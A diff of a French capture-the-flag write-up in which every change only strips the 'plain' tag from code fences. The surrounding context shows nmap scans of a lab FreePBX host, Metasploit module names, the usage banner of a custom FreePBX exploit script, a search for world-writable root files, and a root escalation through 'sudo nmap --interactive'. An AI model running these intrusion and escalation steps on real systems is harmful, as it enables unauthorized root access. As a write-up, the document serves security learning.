@@ -13,7 +13,7 @@ L'objectif final du challenge est d'obtenir un accès root mais aussi de trouver
 Let's go
 --------
 
-```plain
+```
 Nmap scan report for 192.168.1.67
 Host is up (0.0075s latency).
 Not shown: 994 closed ports
@@ -51,7 +51,7 @@ Network Distance: 1 hop
 
 Je vais m'attarder sur le site web (port 80). Un scan UDP rapide révèle aussi les ports suivants :  
 
-```plain
+```
 PORT     STATE SERVICE
 111/udp  open  rpcbind
 5353/udp open  zeroconf
@@ -69,7 +69,7 @@ Un coup de *buster* via le récent module *Wapiti* du même nom permet de trouve
 
 J'ai jeté aussi un coup d’œil dans les modules *Metasploit* : deux modules existent mais je n'ai pas eu de résultats probants et suis resté en *"manuel".*  
 
-```plain
+```
 exploit/unix/http/freepbx_callmenum      2012-03-20       manual     FreePBX 2.10.0 / 2.9.0 callmenum Remote Code Execution
 exploit/unix/webapp/freepbx_config_exec  2014-03-21       excellent  FreePBX config.php Remote Code Execution
 ```
@@ -159,7 +159,7 @@ else:
 
 L'upload passe correctement :  
 
-```plain
+```
 $ python sploit.py 
 devloop exploit for FreePBX <= 2.8.0 (CVE-2010-3490)
 Usage: {0} <url_to_freepbx_admin_directory> <username> <password>
@@ -180,7 +180,7 @@ The way to root
 
 On trouve un fichier appartenant à root et word-writable qui semble d'aucune utilité :  
 
-```plain
+```
 bash-3.2$ find / -user root -perm -o+w -type f 2> /dev/null  | grep -v /proc
 /var/spool/asterisk/voicemail/default/2000/INBOX/msg0001.txt
 bash-3.2$ cat /var/spool/asterisk/voicemail/default/2000/INBOX/msg0001.txt
@@ -204,7 +204,7 @@ duration=1
 
 Par contre les permissions *sudo* sont visiblement à approfondir :  
 
-```plain
+```
 bash-3.2$ sudo -l
 Matching Defaults entries for asterisk on this host:
     env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY
@@ -223,7 +223,7 @@ On peut sinon utiliser *yum* pour installer un logiciel vulnérable et ensuite e
 
 Du coup, après un coup d’œil dans la page de manuel de *nmap*, je l'appelle en mode interactif et invoque */bin/bash* :  
 
-```plain
+```
 bash-3.2$ sudo /usr/bin/nmap --interactive
 
 Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
